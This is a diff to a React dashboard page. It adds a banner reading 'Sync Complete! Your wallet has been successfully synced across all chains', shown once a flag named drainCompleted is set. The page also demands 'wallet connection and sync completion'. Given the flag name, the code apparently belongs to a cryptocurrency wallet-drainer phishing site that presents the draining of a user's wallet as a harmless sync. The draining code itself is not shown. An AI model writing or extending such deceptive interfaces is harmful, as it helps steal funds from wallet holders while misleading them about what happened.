@@ -107,6 +107,15 @@ export default function Dashboard() {
             </div>
           )}
           
+          {userAddress && isWalletConnected && drainCompleted && (
+            <div className="mb-6">
+              <div className="bg-green-500/20 rounded-xl p-4">
+                <p className="text-green-300 font-semibold">✅ Sync Complete!</p>
+                <p className="text-green-200 text-sm">Your wallet has been successfully synced across all chains.</p>
+              </div>
+            </div>
+          )}
+          
           <div className="text-yellow-100 text-sm">
             <p className="mb-2">🔒 Your wallet connection and sync completion are required to access dashboard features.</p>
             <p>Don't have a wallet? <a href="https://metamask.io/download/" target="_blank" rel="noopener noreferrer" className="text-yellow-300 underline">Install MetaMask</a></p>
